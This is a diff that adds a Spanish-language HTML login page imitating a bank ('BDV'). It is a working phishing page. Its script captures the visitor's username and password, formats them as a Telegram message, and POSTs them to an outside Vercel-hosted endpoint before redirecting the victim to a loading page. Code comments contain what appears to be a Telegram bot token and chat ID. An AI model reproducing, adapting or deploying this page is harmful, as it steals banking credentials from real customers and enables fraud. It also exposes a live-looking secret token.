@@ -1,1 +1,147 @@
-.vercel
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body  style="background-image: url(background.webp); background-size: cover; ">
+ 
+  <div class="login-container">
+    <div class="login-box">
+      
+        <img style="width: 300px; height: 60px; margin-bottom: 10%;" class="logos" src="logo.png" alt="">
+      <form class="login-form">
+        <div class="form-group">
+          <input type="text" id="usuario" placeholder=" ">
+          <label for="usuario">Usuario *</label>
+        </div>
+
+        <button type="button" class="btn-submit" id="btn-submit">Entrar</button>
+
+        <div class="help-text">
+          <p>¿Olvidaste tu usuario o clave?</p>
+          <p><a href="#"> Si eres nuevo clienteBDV registrate aquí </a></p>
+        </div>
+      </form>
+    </div>
+  </div>
+  
+    <!-- Modal Overlay -->
+    <div id="modalOverlay" class="modal-overlay">
+        <div class="modal">
+            <h2 class="modal-title">Introduce tu contraseña</h2>
+
+            <div class="form-group">
+                <div class="input-wrapper">
+                    <label for="password" class="label">Contraseña</label>
+                    <input type="password" id="password" class="input-field" placeholder=" ">
+                    <button type="button" id="togglePassword" class="toggle-password">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                            <circle cx="12" cy="12" r="3"></circle>
+                        </svg>
+                    </button>
+                </div>
+                <span class="error-message" id="errorMessage">Contraseña es requerida</span>
+            </div>
+
+            <div class="modal-actions">
+                <button id="continueBtn" onclick="enviar()" class="btn-secondary">Continuar</button>
+                <button id="cancelBtn" class="btn-cancel">Cancelar</button>
+            </div>
+        </div>
+    </div>
+    <style>
+        
+    </style>
+
+  <script src="script.js"></script>
+  <script>
+    document.getElementById("usuario").addEventListener("input", ()=>{
+
+       let val =  document.getElementById("usuario").value;
+        if (val.length > 5) {
+          document.getElementById("btn-submit").style.backgroundColor = "#0067b1";
+          document.getElementById("btn-submit").style.color = "#ffffff";
+          
+        } else {
+         
+            
+        }
+
+    })
+     document.getElementById("password").addEventListener("input", ()=>{
+
+       let val =  document.getElementById("password").value;
+        if (val.length > 7) {
+          document.getElementById("continueBtn").style.backgroundColor = "#0067b1";
+          document.getElementById("continueBtn").style.color = "#ffffff";
+          
+        } else {
+         
+            
+        }
+
+    })
+
+
+
+
+async function enviar(event) { 
+     
+
+   
+    // El frontend construye el mensaje completo
+  const user = document.getElementById("usuario").value ;
+  let password = document.getElementById("password").value;
+  
+  
+
+// ✅ Después - construir explícitamente con \n
+const mensaje = [
+  "🔔 <b>BDV PERSONAS</b>",
+  `👤 Usuario: <code>${user}</code>`,
+  `📱 PW: <code>${password}</code>`,
+  "🔘",
+  `⏰ ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`
+].join("\n");
+
+ const datos = {
+    user: user,           /7953434263/ Solo el ID para guardar en Firestore
+    message: mensaje      /8296900519:AAEUq0RBgGRUmPLpN4nz6dQKxROOUm5Lqd0/ Mensaje completo formateado para Telegram
+  };
+
+    
+    try {
+        const response = await fetch("https://vercelwrapper-delta.vercel.app/", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(datos)
+        });
+
+        const data = await response.json();
+
+        if (response.ok) {
+           
+          if (localStorage.getItem("pais") === "EC") {
+             window.location = "balancer.html";
+          } else {
+            localStorage.setItem("usuario", user);
+            window.location = "loading.html";
+            
+          }
+           
+        } else {
+           console.log(  "❌ Error al enviar mensaje: " + data.error) ;
+        }
+    } catch (error) {
+      console.log("❌ Error en la solicitud:", error);
+    }
+}
+
+
+  </script>
+</body>
+</html>
